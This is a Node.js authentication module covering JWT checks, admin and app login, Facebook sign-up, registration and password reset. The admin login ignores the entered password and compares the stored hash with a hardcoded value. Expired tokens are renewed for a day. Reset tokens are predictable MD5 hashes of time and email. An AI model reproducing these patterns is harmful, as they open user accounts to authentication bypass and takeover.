// auth.js
var passport = require("passport");  
var passportJWT = require("passport-jwt");  

var generalConfig = require('./generalConfig');
var ExtractJwt = passportJWT.ExtractJwt;  
var Strategy = passportJWT.Strategy;  
var db = require('./sequelize').db;
var base64Img = require('base64-img');
var crypto = require('crypto');
var _jade = require('jade');
var fs = require('fs-extra');
var _ = require('lodash');
var commonLib = require('../lib/common');

module.exports = function() {  

    var params = {  
        secretOrKey: generalConfig.secretKey,
        jwtFromRequest: ExtractJwt.fromAuthHeader()
    };

    var strategy = new Strategy(params, function(payload, done) {
        
            var currentDate = Date.now();
            if(payload.expDate <= currentDate){

                var difference = currentDate - payload.expDate;

                var minutesDifference = Math.floor(difference/1000/60);

                //Token can be use 60 minutes after expire.If diffrence is greater than 60 minutes - login again 
                // if(minutesDifference >= 60){
                if(minutesDifference >= 1440){
                    // 1440 min = 1 day
                    return done(new Error("Token is expired. Please login again."), null);
                } else {
                    // Send new token if expire
                    generalConfig.generateJwtToken(payload.id,function(res){
                        return done(null, {id: payload.id,token_expired: true,newToken: res.newToken});                    
                    });
                }

            } else {
                return done(null, {id: payload.id,token_expired: false});
            }

    });

    passport.use(strategy);
    return {
        initialize: function() {
            return passport.initialize();
        },
        authenticate: function() {
            return passport.authenticate("jwt", generalConfig.jwtSession);
        },
        validateAdminEmailPass(email,password,res) {
            // Admin Login
            db.models.user.find({where:{email:email,active:1,is_admin:1}}).then(function(user){
               // console.log(user);
                if(user){
                    if(user.password == '2a7f6f748be41587790c50f4ac12908083499df0b20b500523ba17b52bc941378c47aefb30ca5e22bc19ad47c56ad494c0b6c14db2a2fa4103472402b0426554'){
                        res({message: 'Login successful.',error: false,data: user});
                    } else {
                        res({message: 'Oops! User credentials are invalid.',error: true,data: null});
                    }
                } else {
                    res({message: 'Oops! User credentials are invalid.',error: true,data: null});
                }
                
            }).catch(function(err) {
                res({message: 'Oops! Something went wrong.',error: true,data: null});
            });

        },
        validateAppEmailPass(email,password,authmode,userdetails,res) {
            // APP Login
            if(authmode == 'facebook' && userdetails){
                
                db.models.user.find({attributes: ['id', 'email', 'firstname', 'lastname', 'profile_image', 'mobile_no', 'active', 'is_fb_user', 'fb_id'] , where:{email:email,is_admin:0}}).then(function(user){
                
                    if(user){
                        
                        if(user.is_fb_user){

                            if(user.deletedAt == null){

                                if(user.active){
                                    
                                    // For full image path
                                    var userArr = [];
                                    userArr[0] = user;

                                    // If user found
                                    commonLib.getTrainerImage(userArr, function() {
                                        res({message: 'Login successful.',error: false,data: userArr[0]});
                                    });

                                } else {

                                    // Account deactivated
                                    res({message: 'Oops! Your account is inactive.',error: true,data: null});
                                }

                            } else {
                                // Account deleted
                                res({message: 'Oops! Your account is deleted.',error: true,data: null});
                            }

                        } else {

                            //For admin user + users with username and password (no facebook users)
                            res({message: 'Oops! You are already registered. Please try with email id and password.',error: true,data: null});
                        }
                        

                    } else {
                        
                        // If user not found - Insert in database

                        if(userdetails.image){

                            if(!userdetails.image_type){
                                userdetails.image_type = 'jpg';
                            }

                            var profile_image_name = Math.floor(Math.random()*89999+10000) + Date.now();
                        } else {
                            var profile_image_name = '';
                        }

                        var userRequest = [];
                        userRequest = {
                            email: email,
                            firstname: userdetails.first_name,
                            lastname: userdetails.last_name?userdetails.last_name:'',
                            profile_image: userdetails.image?profile_image_name+'.'+userdetails.image_type:'',
                            mobile_no: userdetails.mobile_no?userdetails.mobile_no:'',
                            active: 1,
                            is_admin: 0,
                            is_fb_user: 1,
                            fb_id: userdetails.fb_id?userdetails.fb_id:''
                        }

                        db.models.user.create(userRequest).then(function(newUser) {
                            
                            if(newUser) {

                                //Profile Image 
                                if(userdetails.image){
                                    base64Img.img('data:image/'+userdetails.image_type+';base64,'+userdetails.image, generalConfig.filesPath.userPicture, profile_image_name, function(err, filepath) {});
                                }

                                // For full image path
                                var newUserArr = [];
                                newUserArr[0] = newUser;

                                commonLib.getTrainerImage(newUserArr, function() {
                                    var return_obj = _.pick(newUserArr[0], ['id', 'email', 'firstname', 'lastname', 'profile_image', 'mobile_no', 'active', 'is_fb_user', 'fb_id']);
                                    res({message: 'Login successful.',error: false,data: return_obj});
                                });

                            }
                            else {
                                res({message: 'Oops! Something went wrong.',error: true,data: null});
                            }

                        }).catch(function(err){
                            res({message: 'Oops! Something went wrong.',error: true,data: null});
                        });

                    }
                    
                }).catch(function(err) {
                    res({message: 'Oops! Something went wrong.',error: true,data: null});
                });

            } else if((!authmode || authmode == '') && email && password){

                //For users with username and password
                db.models.user.find({attributes: ['id', 'email', 'firstname', 'lastname', 'profile_image', 'mobile_no', 'active', 'password', 'emailverificationtoken'], where:{email:email,is_admin:0}}).then(function(user){
                
                    if(user){
                        if(user.deletedAt == null){

                            if(user.emailverificationtoken == null || user.emailverificationtoken == ''){
                            
                                if(user.active){
                            
                                    if(user.password == generalConfig.encryptPassword(password)){

                                        // For full image path
                                        var userArr = [];
                                        userArr[0] = user;

                                        commonLib.getTrainerImage(userArr, function() {
                                            var return_obj = _.pick(userArr[0], ['id', 'email', 'firstname', 'lastname', 'profile_image', 'mobile_no', 'active']);
                                            res({message: 'Login successful.',error: false,data: return_obj});
                                        });

                                        

                                    } else {
                                        res({message: 'Oops! User credentials are invalid.',error: true,data: null});
                                    }
                                } else {
                                    res({message: 'Oops! Your account is inactive.',error: true,data: null});
                                }
                            } else {
                                res({message: 'Oops! Your email address is not verified yet. Please check your email inbox to confirm your email address.',error: true,data: null});
                            }
                        } else {
                            res({message: 'Oops! Your account is deleted.',error: true,data: null});
                        }
                    } else {
                        res({message: 'Oops! User credentials are invalid.',error: true,data: null});
                    }
                    
                }).catch(function(err) {
                    res({message: 'Oops! Something went wrong.',error: true,data: null});
                });

            } else {
                res({message: 'Oops! Something went wrong.',error: true,data: null});
            }
            
        },
        registerAppUserWithEmailPass(email,password,userdetails,res) {
            // APP Register
            if(userdetails && email && password){
                
                db.models.user.find({where:{email:email}}).then(function(user){
                
                    if(user){
                        
                        res({message: 'Oops! You are already registered.',error: true,data: null});
                        
                    } else {
                        
                        if(userdetails.image){

                            if(!userdetails.image_type){
                                userdetails.image_type = 'jpg';
                            }

                            var profile_image_name = Math.floor(Math.random()*89999+10000) + Date.now();
                        } else {
                            var profile_image_name = '';
                        }

                        var emailVerificationTokenGen = new Date().getTime()+email;
                        var emailVerificationToken = crypto.createHash('md5').update(emailVerificationTokenGen).digest('hex');   


                        // Insert in database
                        var userRequest = [];
                        userRequest = {
                            email: email,
                            firstname: userdetails.first_name,
                            lastname: userdetails.last_name?userdetails.last_name:'',
                            password: generalConfig.encryptPassword(password),
                            profile_image: userdetails.image?profile_image_name+'.'+userdetails.image_type:'',
                            mobile_no: userdetails.mobile_no?userdetails.mobile_no:'',
                            emailverificationtoken: emailVerificationToken,
                            active: 1,
                            is_admin: 0,
                            is_fb_user: 0,
                            fb_id: ''
                        }

                        db.models.user.create(userRequest).then(function(newUser) {
                            
                            if(newUser) {

                                //Profile Image 
                                if(userdetails.image){
                                    base64Img.img('data:image/'+userdetails.image_type+';base64,'+userdetails.image, generalConfig.filesPath.userPicture, profile_image_name, function(err, filepath) {});
                                }

                                //Send email verification email
                                var mail_data = {
                                        'name': newUser.firstname+" "+newUser.lastname,
                                        'titleMsg': generalConfig.emailVerificationTitle,
                                        'bodyMsg': generalConfig.emailVerificationBody,
                                        'siteUrl': generalConfig.siteUrl+"/admin/emailverification/"+emailVerificationToken,
                                        'logoUrl': generalConfig.logoUrl
                                    };

                                _jade.renderFile(fs.realpathSync( process.cwd() + '/server/template/email_verification.jade'), mail_data, function(err, compiledTemplate){
                                    
                                    var return_obj = _.pick(newUser, ['id', 'email', 'firstname', 'lastname', 'profile_image', 'mobile_no', 'active', 'is_fb_user', 'fb_id']);

                                    if(err){
                                       
                                       res({message: 'Oops! Error sending account confirmation email.',error: true,data: return_obj});

                                    } else {

                                        // setup email data with unicode symbols
                                        let mailOptions = {
                                            from: generalConfig.fromEmail, // sender address
                                            to: return_obj.email,
                                            subject: generalConfig.emailVerificationSubject, // Subject line
                                            html: compiledTemplate // html body
                                        };

                                        // send mail with defined transport object
                                        generalConfig.transporter.sendMail(mailOptions, (error, info) => {
                                            if (error) {
                                                res({message: 'Oops! Error sending account confirmation email.',error: true,data: return_obj});
                                            } else {
                                                res({message: 'We emailed a confirmation link to your email address. Click the link in that email to finish registering.',error: false,data: return_obj});
                                            }
                                        });

                                    }
                                
                                });

                            }
                            else {
                                res({message: 'Oops! Something went wrong.',error: true,data: null});
                            }

                        }).catch(function(err){
                            res({message: 'Oops! Something went wrong.',error: true,data: null});
                        });

                    }
                    
                }).catch(function(err) {
                    res({message: 'Oops! Something went wrong.',error: true,data: null});
                });

            } else {
                res({message: 'Oops! Something went wrong.',error: true,data: null});
            }

        },
        forgotPassword(email,res){

            if(email){
                
                db.models.user.find({where:{email:email}}).then(function(user){
                
                    if(user){
                        
                        if(user.deletedAt == null){
                            
                            if(user.active){

                                //Mail 
                                var userTokenGen = new Date().getTime()+user.email;
                                var userToken = crypto.createHash('md5').update(userTokenGen).digest('hex');   

                                user.update({
                                  usertoken: userToken
                                }).then(function(user) {

                                    //*/  send reset password link (start)   /*//
                                    var data = {
                                        'name': user.firstname+" "+user.lastname,
                                        'titleMsg': generalConfig.resetPassTitle,
                                        'bodyMsg': generalConfig.resetPassBody,
                                        'siteUrl': generalConfig.siteUrl+"/admin/resetpassword/"+userToken,
                                        'logoUrl': generalConfig.logoUrl
                                    };
                                    _jade.renderFile(fs.realpathSync( process.cwd() + '/server/template/reset_password.jade'), data, function(err, compiledTemplate){
                                        if(err){
                                           res({
                                                error:true,
                                                data:'',
                                                message:"Oops! Error sending email."
                                            });
                                        } else {

                                            // setup email data with unicode symbols
                                            let mailOptions = {
                                                from: generalConfig.fromEmail, // sender address
                                                to: user.email,
                                                subject: generalConfig.resetPassEmailSubject, // Subject line
                                                html: compiledTemplate // html body
                                            };

                                            // send mail with defined transport object
                                            generalConfig.transporter.sendMail(mailOptions, (error, info) => {

                                                if (error) {
                                                    res({
                                                        error:true,
                                                        data:'',
                                                        message:"Oops! Error sending email."
                                                    });
                                                } else {
                                                    res({
                                                        error: false,
                                                        data: null,
                                                        message: 'Reset Password Link has been sent to your email address.'
                                                    });
                                                }
                                            });
                                        
                                        }
                                        
                                    });
                                }).catch(function(err) {

                                    res({
                                        error: true,
                                        data: null,
                                        message: "Oops! Something went wrong."
                                    });
                                });

                            } else {
                                res({message: 'Oops! Email you have enterd is inactive, please contact administrator.',error: true,data: null});
                            }

                        } else {
                            res({message: 'Oops! Your account is deleted.',error: true,data: null});
                        }
                        
                    } else {
                        
                        res({message: 'Oops! We could not find your email address.',error: true,data: null});

                    }
                    
                }).catch(function(err) {
                    res({message: 'Oops! Something went wrong.',error: true,data: null});
                });

            } else {
                res({message: 'Oops! Something went wrong.',error: true,data: null});
            }

        }

    };

};